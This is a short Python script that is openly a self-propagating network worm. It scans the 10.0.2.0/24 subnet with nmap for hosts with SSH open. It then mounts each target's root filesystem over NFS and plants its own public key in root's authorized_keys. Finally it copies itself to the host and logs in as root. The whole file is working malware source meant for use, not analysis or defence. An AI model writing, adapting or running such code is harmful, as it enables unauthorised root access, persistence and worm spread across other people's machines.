#! /usr/bin/env python3
import os
import nmap
def main():
    def ssh():
        ssh_list = []                                    #Define a list to contain ip's open on port 22
        nm = nmap.PortScanner()                          #Instantiate portscanner object
        nm.scan('10.0.2.0/24','22')                      #Scan ports 10.0.2.0 - 10.0.2.256 on port 22
        for host in nm.all_hosts():                      #Create a for loop to iterate over the scanned host
            if nm[host]['tcp'][22]['state'] == 'open':   #Validate port 22 is open
                ssh_list.append(host)                    #Add validate hosts to ssh_list
        return(ssh_list)
    def worm():
        for ip in ssh():
            os.system('mkdir ~/lotus')
            os.system('cp -r * ~/lotus')
            os.system('{ echo -ne "\n" ; echo -ne "y" ; echo -ne "\n"; } | ssh-keygen')
            os.system('mkdir /tmp/r00t')
            os.system('mount -t nfs ' + str(ip) + ':/ /tmp/r00t/')
            os.system('cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys')
            os.system('umount /tmp/r00t')
            os.system('scp -r ~/lotus root@' + str(ip) + ':./')
            os.system('ssh root@'  + str(ip))
    worm()
main()
